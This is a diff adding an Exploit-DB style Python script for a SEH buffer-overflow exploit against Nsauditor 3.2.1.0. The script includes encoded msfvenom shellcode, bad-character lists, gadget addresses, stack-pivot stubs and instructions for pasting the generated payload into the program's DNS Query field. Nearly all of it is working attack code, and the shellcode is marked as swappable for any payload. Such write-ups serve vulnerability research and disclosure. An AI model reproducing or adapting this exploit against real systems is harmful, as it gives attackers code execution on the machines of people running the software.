@@ -1,0 +1,108 @@
+# Exploit Title: Nsauditor 3.2.1.0 - Buffer Overflow (SEH+ASLR bypass (3 bytes overwrite))
+# Date: 2020-04-17
+# Exploit Author: Cervoise
+# Vendor Homepage: https://www.nsauditor.com/
+# Software Link: https://www.nsauditor.com/downloads/nsauditor_setup.exe
+# Version: 3.2.1.0 and 3.0.28
+# Tested on: Windows 10.0.18363.778 x86 Pro EN
+
+# Exploit originally found on Nsauditor 3.0.28.0 by ACHILLES 
+(https://www.exploit-db.com/exploits/46005)
+# Latest version Nsauditor 3.2.1.0 (4/13/2020 1:51:53) is still 
+vulnerable
+
+# 1 -> Change the shellcode with the one you want
+# 2 -> Open nsauditor-3-2-1-exploit.txt and copy content to clipboard
+# 3 -> Open Nsauditor
+# 4 -> In the Window select "Tools" -> "Dns Lookup"
+# 5 -> Paste the content into the Field: "Dns Query'"
+# 6 -> Click "Resolve"
+
+#!/usr/bin/python3
+
+# Badchars -> 
+\x00\x0a\x0d\x2e\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9f\xf0\xf1\xf2\xf3\xf4\xf5\xf6
+# Maybe less badchars between \x80 and \x9f but I was lazy (I just 
+checked thoose I needed)
+
+# msfvenom -p windows/exec CMD=calc -e x86/alpha_mixed -f python -v 
+shellcode
+shellcode =  b""
+shellcode += b"\x89\xe7\xd9\xe9\xd9\x77\xf4\x59\x49\x49\x49"
+shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43"
+shellcode += b"\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30"
+shellcode += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
+shellcode += b"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
+shellcode += b"\x42\x75\x4a\x49\x4b\x4c\x4a\x48\x6e\x62\x73"
+shellcode += b"\x30\x37\x70\x75\x50\x35\x30\x6f\x79\x68\x65"
+shellcode += b"\x36\x51\x6f\x30\x43\x54\x4e\x6b\x70\x50\x30"
+shellcode += b"\x30\x4e\x6b\x43\x62\x56\x6c\x4c\x4b\x73\x62"
+shellcode += b"\x54\x54\x6c\x4b\x61\x62\x65\x78\x36\x6f\x58"
+shellcode += b"\x37\x71\x5a\x56\x46\x66\x51\x49\x6f\x6e\x4c"
+shellcode += b"\x65\x6c\x51\x71\x53\x4c\x43\x32\x46\x4c\x47"
+shellcode += b"\x50\x6f\x31\x4a\x6f\x66\x6d\x46\x61\x79\x57"
+shellcode += b"\x69\x72\x69\x62\x46\x32\x36\x37\x4c\x4b\x63"
+shellcode += b"\x62\x76\x70\x4c\x4b\x63\x7a\x45\x6c\x6e\x6b"
+shellcode += b"\x72\x6c\x47\x61\x62\x58\x79\x73\x77\x38\x55"
+shellcode += b"\x51\x7a\x71\x72\x71\x6e\x6b\x62\x79\x57\x50"
+shellcode += b"\x37\x71\x78\x53\x4e\x6b\x57\x39\x72\x38\x5a"
+shellcode += b"\x43\x54\x7a\x61\x59\x4e\x6b\x57\x44\x4c\x4b"
+shellcode += b"\x45\x51\x39\x46\x30\x31\x79\x6f\x6e\x4c\x5a"
+shellcode += b"\x61\x4a\x6f\x44\x4d\x63\x31\x79\x57\x76\x58"
+shellcode += b"\x49\x70\x51\x65\x69\x66\x76\x63\x43\x4d\x58"
+shellcode += b"\x78\x45\x6b\x51\x6d\x57\x54\x64\x35\x48\x64"
+shellcode += b"\x46\x38\x6c\x4b\x42\x78\x67\x54\x36\x61\x6a"
+shellcode += b"\x73\x31\x76\x6c\x4b\x44\x4c\x52\x6b\x6c\x4b"
+shellcode += b"\x66\x38\x65\x4c\x57\x71\x4a\x73\x6e\x6b\x36"
+shellcode += b"\x64\x4e\x6b\x47\x71\x38\x50\x6d\x59\x42\x64"
+shellcode += b"\x35\x74\x51\x34\x31\x4b\x33\x6b\x70\x61\x42"
+shellcode += b"\x79\x43\x6a\x50\x51\x6b\x4f\x4d\x30\x33\x6f"
+shellcode += b"\x63\x6f\x43\x6a\x4e\x6b\x77\x62\x7a\x4b\x6e"
+shellcode += b"\x6d\x53\x6d\x50\x6a\x67\x71\x4e\x6d\x6c\x45"
+shellcode += b"\x4e\x52\x73\x30\x37\x70\x75\x50\x72\x70\x35"
+shellcode += b"\x38\x46\x51\x4e\x6b\x52\x4f\x4f\x77\x4b\x4f"
+shellcode += b"\x38\x55\x6f\x4b\x4c\x30\x6e\x55\x6c\x62\x71"
+shellcode += b"\x46\x53\x58\x4f\x56\x6d\x45\x6d\x6d\x6d\x4d"
+shellcode += b"\x39\x6f\x58\x55\x47\x4c\x44\x46\x43\x4c\x74"
+shellcode += b"\x4a\x6b\x30\x49\x6b\x59\x70\x34\x35\x47\x75"
+shellcode += b"\x6f\x4b\x50\x47\x56\x73\x73\x42\x70\x6f\x53"
+shellcode += b"\x5a\x67\x70\x51\x43\x4b\x4f\x6b\x65\x31\x73"
+shellcode += b"\x70\x61\x52\x4c\x30\x63\x73\x30\x41\x41"
+
+
+# 0x006ea017 : pop esi # pop ecx # ret  | startnull 
+{PAGE_EXECUTE_WRITECOPY} [Nsauditor.exe] ASLR: False, Rebase: False, 
+SafeSEH: False, OS: False, v3.0.28.0 (C:\Program 
+Files\Nsauditor\Nsauditor.exe)
+# 0x006ea017 : pop esi # pop ecx # ret  | startnull 
+{PAGE_EXECUTE_WRITECOPY} [Nsauditor.exe] ASLR: False, Rebase: False, 
+SafeSEH: False, OS: False, v3.2.1.0 (C:\Program 
+Files\Nsauditor\Nsauditor.exe)
+
+pop_pop_ret = b"\x17\xa0\x6e"
+jmp_back = b"\xeb\xc3\x90\x90"  #JMP    0xffffffc5
+
+# An address near the end of our buffer is on the stack, only three pop 
+are needed to get it
+# Then we just have to moving at the begging of our buffer
+# An egghunter does the job, but will not be compatible with all Windows 
+versions
+going_back = b"\x58"            #POP EAX
+going_back += b"\x58"           #POP EAX
+going_back += b"\x58"           #POP EAX
+going_back += b"\x83\xE8\x79"   #SUB   EAX,0x79
+going_back += b"\x83\xE8\x79"   #SUB   EAX,0x79
+going_back += b"\x83\xE8\x79"   #SUB   EAX,0x79
+going_back += b"\x83\xE8\x79"   #SUB   EAX,0x79
+going_back += b"\x83\xE8\x79"   #SUB   EAX,0x79
+going_back += b"\xFF\xE0"       #JMP EAX
+
+buffer = b"\x90"*(5235-len(shellcode)-len(going_back)-100)
+buffer += shellcode + b"\x90"*100
+buffer += going_back
+buffer += jmp_back + pop_pop_ret #nSEH / SEH
+
+# Write the exploit
+file = open("nsauditor-3-2-1-exploit.txt", "wb")
+file.write(buffer)
+file.close()
